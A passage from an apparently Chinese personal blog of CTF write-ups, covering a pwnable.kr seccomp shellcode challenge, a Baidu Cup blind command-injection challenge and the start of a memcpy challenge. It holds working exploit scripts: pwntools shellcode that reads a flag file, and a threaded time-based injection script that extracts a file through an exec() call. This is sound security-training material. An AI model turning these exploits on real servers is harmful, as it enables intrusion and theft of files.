seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		seccomp_release(ctx);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">	read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">	alarm(<span class="number">10</span>);</span><br><span class="line">	chroot(<span class="string">"/home/asm_pwn"</span>);	<span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">	sandbox();</span><br><span class="line">	((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序就是让输入一段<code>shellcode</code>，然后程序会在一个<code>sandbox</code>沙箱环境下执行这个<code>shellcode</code>。另外shellcode前面的<code>stub</code>也是一段可执行序列，用<code>pwntools</code>的asm模块反汇编看一下就知道这个序列只是将一些寄存器置0，不会影响后面shellcode的执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print disasm(&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;)</span><br><span class="line">   0:   48                      dec    eax</span><br><span class="line">   1:   31 c0                   xor    eax,eax</span><br><span class="line">   3:   48                      dec    eax</span><br><span class="line">   4:   31 db                   xor    ebx,ebx</span><br><span class="line">   6:   48                      dec    eax</span><br><span class="line">   7:   31 c9                   xor    ecx,ecx</span><br><span class="line">   9:   48                      dec    eax</span><br><span class="line">   a:   31 d2                   xor    edx,edx</span><br><span class="line">   c:   48                      dec    eax</span><br><span class="line">   d:   31 f6                   xor    esi,esi</span><br><span class="line">   f:   48                      dec    eax</span><br><span class="line">  10:   31 ff                   xor    edi,edi</span><br><span class="line">  12:   48                      dec    eax</span><br><span class="line">  13:   31 ed                   xor    ebp,ebp</span><br><span class="line">  15:   4d                      dec    ebp</span><br><span class="line">  16:   31 c0                   xor    eax,eax</span><br><span class="line">  18:   4d                      dec    ebp</span><br><span class="line">  19:   31 c9                   xor    ecx,ecx</span><br><span class="line">  1b:   4d                      dec    ebp</span><br><span class="line">  1c:   31 d2                   xor    edx,edx</span><br><span class="line">  1e:   4d                      dec    ebp</span><br><span class="line">  1f:   31 db                   xor    ebx,ebx</span><br><span class="line">  21:   4d                      dec    ebp</span><br><span class="line">  22:   31 e4                   xor    esp,esp</span><br><span class="line">  24:   4d                      dec    ebp</span><br><span class="line">  25:   31 ed                   xor    ebp,ebp</span><br><span class="line">  27:   4d                      dec    ebp</span><br><span class="line">  28:   31 f6                   xor    esi,esi</span><br><span class="line">  2a:   4d                      dec    ebp</span><br><span class="line">  2b:   31 ff                   xor    edi,edi</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
<p>刚开始做不懂<code>sandbox</code>这个函数啥意思，里面的函数也没见过，于是看了被人的writeup才知道这个函数建立了一个沙箱环境，并且只能执行<code>read,open,write,exit,exit_group</code>这些函数。但是对于读取flag文件来说已经够了。<br>可以使用<code>open</code>函数打开flag文件，<code>read</code>读取文件内容，<code>write</code>将文件内容写入标准输出<code>1</code>中即可。下面贴出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">con = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'asm'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">r = con.connect_remote(<span class="string">'localhost'</span>,<span class="number">9026</span>)</span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.pushstr(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</span><br><span class="line">shellcode += shellcraft.open(<span class="string">'rsp'</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">'rax'</span>,<span class="string">'rsp'</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">'rsp'</span>,<span class="number">100</span>)</span><br><span class="line">r.recvuntil(<span class="string">'give me your x64 shellcode: '</span>)</span><br><span class="line">r.sendline(asm(shellcode))</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># python 1.py</span></span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[!] Couldn<span class="string">'t check security settings on '</span>pwnable.kr<span class="string">'</span></span><br><span class="line"><span class="string">[+] Connecting to localhost:9026 via SSH to pwnable.kr: Done</span></span><br><span class="line"><span class="string">[+] Receiving all data: Done (100B)</span></span><br><span class="line"><span class="string">[*] Closed remote connection to localhost:9026 via SSH connection to pwnable.kr</span></span><br><span class="line"><span class="string">Mak1ng_shelLcodE_i5_veRy_eaSy</span></span><br><span class="line"><span class="string">lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>发现<code>pwntools</code>这个Python库很好用，<a href="https://www.cnblogs.com/Ox9A82/p/5728149.html" target="_blank" rel="noopener">一些基础模块的使用简介</a>。当然看<a href="http://pwntools.readthedocs.io/en/stable/" target="_blank" rel="noopener">官方文档</a>的话更好，前提是你英语要好，哈哈。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/13/百度杯CTF比赛 十月场-EXEC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/13/百度杯CTF比赛 十月场-EXEC/" itemprop="url">
                  百度杯CTF比赛 十月场-EXEC
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-13 20:48:00" itemprop="dateCreated datePublished" datetime="2018-02-13T20:48:00+08:00">2018-02-13</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:35:53" itemprop="dateModified" datetime="2018-08-04T22:35:53+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/13/百度杯CTF比赛 十月场-EXEC/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/13/百度杯CTF比赛 十月场-EXEC/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/13/百度杯CTF比赛 十月场-EXEC/" class="leancloud_visitors" data-flag-title="百度杯CTF比赛 十月场-EXEC">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题本来要用<code>bash反弹shell</code>的技术的，但是由于没有公网ip的服务器，我就用了命令盲注的方法，特此记录一下。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>打开链接题目提示<code>no sign</code>。查看源代码发现这一行<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">language</span>=<span class="string">'utf-8'</span> <span class="attr">editor</span>=<span class="string">'vim'</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>于是就想到了<code>vim信息泄露</code>，于是访问<code>.index.php.swp</code>成功下载了源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;blind cmd exec&lt;/title&gt;</span><br><span class="line">&lt;meta language=<span class="string">'utf-8'</span> editor=<span class="string">'vim'</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;img src=pic.gif&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag in flag233.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'11259375'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">	setcookie(<span class="string">'auth'</span>,<span class="string">'tcp tunnel is forbidden!'</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">		$command=$_POST[cmd];</span><br><span class="line">		$result=exec($command);</span><br><span class="line">		<span class="comment">//echo $result;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'no sign'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>分析源码，发现可以执行命令，但是没有回显。最先想到的就是bash反弹shell来执行命令，此外题目提示<code>tcp tunnel is forbidden!</code>，就只能反弹到udp的端口了。但是我没有公网ip的服务器咋办啊，于是联想到以前做过的sql盲注这次我来个命令盲注。<br>页面没有回显，就只能做基于时间的盲注了，脚本总的来说很简单，使用了多线程，下面贴出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string,threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200</span>):</span><br><span class="line">        data[<span class="string">'cmd'</span>]=<span class="string">"a=$(%s);b=$&#123;#a&#125;;if test $b -eq %d;then sleep 3;fi"</span>%(payload,i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            length = i</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"the string length is &#123;&#125;"</span>.format(length)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getString</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> length,lock,curId,key</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    words = string.uppercase+string.lowercase+string.digits+<span class="string">'/=+'</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        lock.acquire()</span><br><span class="line">        <span class="keyword">if</span> curId == length:</span><br><span class="line">            lock.release()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i = curId</span><br><span class="line">        curId += <span class="number">1</span></span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> words:</span><br><span class="line">            data[<span class="string">'cmd'</span>]=<span class="string">"a=$(&#123;&#125;);b=`expr substr $a &#123;&#125; 1`;if test $b = '&#123;&#125;';then sleep 8;fi"</span>.format(payload,i+<span class="number">1</span>,j)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.post(url,data=data,timeout=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                key[i] = j</span><br><span class="line">                lock.acquire()</span><br><span class="line">                <span class="keyword">print</span> <span class="string">''</span>.join(key)</span><br><span class="line">                lock.release()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://708ff2d40f1d48a5bef9408daed3fa0665c6180098394883.game.ichunqiu.com/?sign=0xabcdef'</span></span><br><span class="line">payload = <span class="string">"base64 flag233.php -w 0"</span> </span><br><span class="line">length = getLength(url,payload)</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">curId = <span class="number">0</span> <span class="comment">#max(curId) = length - 1</span></span><br><span class="line">key = [<span class="string">'?'</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(length)]</span><br><span class="line"></span><br><span class="line">th=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=getString,args=(url,payload))</span><br><span class="line">    th.append(t)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> th:</span><br><span class="line">    t.start()  </span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> th:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是，题目使用的shell是<code>sh</code>（<code>dash</code>和<code>bash</code>的区别<a href="http://ju.outofmemory.cn/entry/135" target="_blank" rel="noopener">看这个</a>），所以在字串截取时不能使用<code>bash</code>的<code>${a:1:1}</code>的方式。还有就是在使用<code>expr substr</code>进行子串截取时目标字符串需要是单行的否则会出错，可以配合<code>head</code>和<code>tail</code>命令一行一行读取。这里我使用了<code>base64</code>命令将命令结果编码，防止换行或特殊字符干扰。注意要使用<code>base64 -w 0</code>关闭换行。<br>最后运行代码获得flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo PD9waHAKCSRmbGFnPSdmbGFne2ExMWM4MjI3LWMyNGItNDAyNC1hMDRhLTdiOGIxOTYxZGM1ZH0nOwo/PgpoaGhoaGhoaGhoaCx0b28geW91bmcgdG9vIHNpbXBsZQo= | base64 -d</span></span><br><span class="line">&lt;?php</span><br><span class="line">	<span class="variable">$flag</span>=<span class="string">'flag&#123;a11c8227-c24b-4024-a04a-7b8b1961dc5d&#125;'</span>;</span><br><span class="line">?&gt;</span><br><span class="line">hhhhhhhhhhh,too young too simple</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>还需要注意的是，由于题目平台资源限制，使用多线程会导致平台反应过慢从而导致盲注的正确性降低。可以通过减少线程或是增大<code>sleep</code>的时间来增加正确率。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>算是另辟蹊径了，而且在写代码的时候学到了很多。原来不熟悉，不理解的命令用法更清楚了。但是还要注意的是，时间盲注在注入时间较长时就容易造成误差，有的字节会出错，反正再有别的解决方法时时间盲注不是优先选择的方法。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/13/pwnable.kr-memcpy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/13/pwnable.kr-memcpy/" itemprop="url">
                  pwnable.kr-memcpy
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-02-13 14:43:00" itemprop="dateCreated datePublished" datetime="2018-02-13T14:43:00+08:00">2018-02-13</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/02/13/pwnable.kr-memcpy/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/13/pwnable.kr-memcpy/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/02/13/pwnable.kr-memcpy/" class="leancloud_visitors" data-flag-title="pwnable.kr-memcpy">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题还是参考了别人的writeup，学到了内存对齐的知识。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先分析源代码<code>memcpy.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 